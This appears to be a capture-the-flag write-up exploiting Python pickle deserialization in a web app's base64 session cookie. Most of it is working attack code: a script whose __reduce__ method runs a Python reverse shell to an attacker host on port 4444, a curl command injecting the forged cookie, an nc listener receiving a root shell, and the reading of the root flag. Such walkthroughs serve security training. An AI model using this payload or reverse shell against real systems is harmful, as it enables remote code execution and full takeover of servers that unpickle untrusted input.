Python pickle deserialization vulnerability.

### Initial Discovery
```
# Web app at http://10.10.10.115
# Cookie contains base64 data
Cookie: session=KGRwMApTJ3VzZXInCnAxClMnZ3Vlc3QnCnAyCnMu

# Decode base64
echo "KGRwMApTJ3VzZXInCnAxClMnZ3Vlc3QnCnAyCnMu" | base64 -d
# (dp0
# S'user'
# p1
# S'guest'
# p2
# s
# Pickle data!
```

#### Create Malicious Pickle
```
# evil_pickle.py
import pickle
import base64
import os

class Evil:
    def __reduce__(self):
        return (os.system, ("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",))

evil = Evil()
pickled = pickle.dumps(evil)
b64_pickled = base64.b64encode(pickled).decode()
print(b64_pickled)
```

```
# Generate payload
python3 evil_pickle.py
# gASVXwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjM1weXRob24gLWMgJ2ltcG9ydCBzb2NrZX...
```

#### Inject Malicious Cookie
```
# Set cookie to malicious pickle
curl -H "Cookie: session=gASVXwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjM1weXRob24gLWMgJ2ltcG9ydCBzb2NrZX..." http://10.10.10.115/

# On attacker
nc -lvnp 4444
# Connection from 10.10.10.115
# root@target:~#
```

#### Root Access
```
# Already root! The app runs as root
whoami
# root

# Get flags
cat /root/root.txt
# 7f7b2a9c8e1d5f6a9b2c3d4e5f6a7b8c
```

